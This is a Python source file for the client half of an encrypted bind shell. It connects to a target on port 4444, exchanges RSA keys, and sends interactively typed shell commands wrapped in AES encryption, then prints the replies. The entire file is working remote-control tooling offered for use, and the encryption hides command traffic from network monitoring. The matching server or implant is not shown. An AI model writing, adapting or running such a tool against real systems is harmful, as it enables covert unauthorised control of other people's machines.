import os
import socket
import threading
import logging

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.serialization import load_pem_public_key

class BindShellClient:
    def __init__(self): 
        self.host = "0.0.0.0" # change this line
        self.port = 4444      # change this line

        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s: %(message)s'
        )
        self.logger = logging.getLogger(__name__)

        self.client_private_key, self.client_public_key = self._generate_asymmetric_keys()

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_public_key = None

    def _generate_asymmetric_keys(self):
        self.logger.info("Generating 4096-bit RSA key pair")
        private = rsa.generate_private_key(
            public_exponent = 65537,
            key_size = 4096
        )
        public = private.public_key()

        return private, public

    def _generate_symmetric_keys(self):
        aes_key = os.urandom(32)
        iv = os.urandom(16)

        return aes_key, iv


    def _decrypt_message(self, encrypted_data):
        encrypted_key, encrypted_message = encrypted_data.split(b"::", 1)
        
        key_iv = self.client_private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        aes_key, iv = key_iv[:32], key_iv[32:]
        
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
        decryptor = cipher.decryptor()
        decrypted_message = decryptor.update(encrypted_message) + decryptor.finalize()
        return decrypted_message.decode('utf-8')
    

    def _encrypt_message(self, message):
        aes_key, iv = self._generate_symmetric_keys()
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
        encryptor = cipher.encryptor()
        encrypted_message = encryptor.update(message.encode("utf-8")) + encryptor.finalize()

        encrypted_key_iv = self.server_public_key.encrypt(
            aes_key + iv,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        return encrypted_key_iv + b"::" + encrypted_message


    def display_prompt(self):
        print("\ncmd > ", end="", flush=True)

    def connect(self):
        self.logger.info(f"Attempting to connect to {self.host}:{self.port}")
        self.socket.connect((self.host, self.port))

        self.logger.info(f"Attempting key pair exchange")
        self.socket.send(
            self.client_public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )

        server_key_data = self.socket.recv(4096)
        self.server_public_key = serialization.load_pem_public_key(server_key_data)
        if not self.server_public_key:
            raise ValueError("Server public key not established")

        self.logger.info("Key exchange completed")        
        return True

    def receive_response(self):
        while True:
            try:
                encrypted_data = self.socket.recv(4096)
                if not encrypted_data:
                    break

                response = self._decrypt_message(encrypted_data)
                if response == "KEY_RECEIVED":
                    continue
                print(response)
                self.display_prompt()

            except Exception as err:
                self.logger.error(f"Error receiving data: {err}")
                break

    def start(self):
        try:
            if not self.connect():
                raise ConnectionError

            receive_thread = threading.Thread(target=self.receive_response)
            receive_thread.daemon = True
            receive_thread.start()
            self.display_prompt()

            while True:
                user_input = input()
                command = user_input.strip()
                encrypted_command = self._encrypt_message(command)

                self.socket.send(encrypted_command)
                if command in ["exit", "quit"]:
                    self.logger.info("Exiting the interactive shell")
                    break

        except ConnectionError:
            self.logger.error(f"Failed to connect to {self.host}:{self.port} ")
        except Exception as err:
            self.logger.error(f"Client error: {err}")
        finally:
            self.socket.close()

if __name__ == "__main__":
    client = BindShellClient()
    client.start()
